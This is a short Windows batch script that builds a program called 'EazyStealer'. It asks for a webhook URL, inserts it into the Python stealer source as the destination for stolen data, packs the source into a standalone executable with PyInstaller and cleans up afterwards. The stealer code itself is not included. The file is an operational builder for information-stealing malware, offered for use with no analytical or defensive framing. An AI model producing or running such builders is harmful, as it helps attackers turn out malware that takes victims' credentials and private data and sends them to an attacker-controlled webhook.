@echo off
setlocal

set /p webhook_url=Please enter your webhook URL: 

if "%webhook_url%"=="" (
    echo No webhook URL provided. Exiting...
    exit /b
)
powershell -Command "(gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py"

python -m PyInstaller --onefile EazyStealer.py

del EazyStealer.spec
rmdir /s /q build

echo Build complete! Your executable is located in the dist folder.
endlocal
pause
